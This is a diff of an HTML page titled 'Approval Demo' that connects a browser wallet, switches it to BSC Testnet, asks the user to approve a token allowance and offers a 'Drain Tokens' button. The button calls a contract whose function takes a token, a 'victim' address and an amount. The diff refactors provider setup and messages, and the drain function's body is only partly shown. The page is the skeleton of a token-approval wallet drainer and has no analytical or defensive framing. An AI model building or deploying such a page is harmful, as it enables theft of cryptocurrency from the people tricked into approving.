@@ -2,8 +2,6 @@
 <html>
 <head>
   <title>Approval Demo</title>
-
-  <!-- Stable ethers CDN -->
   <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/5.7.2/ethers.umd.min.js"></script>
 </head>
 
@@ -16,7 +14,7 @@
 <button onclick="drain()">Drain Tokens</button>
 
 <script>
-let provider, signer;
+let provider, signer, userAddress;
 
 const tokenAddress = "0x089d6677646bc535B1A8535ED856bb17493E332d";
 const drainAddress = "0x0ccb058f48f5caa16c7026e7d34c103544c2d172";
@@ -30,13 +28,21 @@ const drainABI = [
   "function drain(address token, address victim, uint256 amount) public"
 ];
 
-// 🔁 Reload if network changes
+// Reload on network change
 if (window.ethereum) {
   window.ethereum.on("chainChanged", () => {
     window.location.reload();
   });
 }
 
+// 🔑 Initialize provider safely
+async function initProvider() {
+  provider = new ethers.providers.Web3Provider(window.ethereum);
+  signer = provider.getSigner();
+  userAddress = await signer.getAddress();
+}
+
+// CONNECT
 async function connect() {
   try {
     if (!window.ethereum) {
@@ -44,21 +50,18 @@ async function connect() {
       return;
     }
 
-    // Request account
     await window.ethereum.request({ method: "eth_requestAccounts" });
 
-    // Force BSC Testnet (chainId 97)
+    // Switch to BSC Testnet
     await window.ethereum.request({
       method: "wallet_switchEthereumChain",
       params: [{ chainId: "0x61" }]
     });
 
-    provider = new ethers.providers.Web3Provider(window.ethereum);
-    signer = provider.getSigner();
+    // 🔥 Re-init AFTER switch
+    await initProvider();
 
-    const address = await signer.getAddress();
-
-    alert("✅ Connected: " + address);
+    alert("✅ Connected: " + userAddress);
 
   } catch (e) {
     console.error(e);
@@ -66,6 +69,7 @@ async function connect() {
   }
 }
 
+// APPROVE
 async function approve() {
   try {
     if (!signer) {
@@ -82,7 +86,7 @@ async function approve() {
 
     await tx.wait();
 
-    alert("✅ Approved successfully");
+    alert("✅ Approved");
 
   } catch (e) {
     console.error(e);
@@ -90,6 +94,7 @@ async function approve() {
   }
 }
 
+// DRAIN
 async function drain() {
   try {
     if (!signer) {
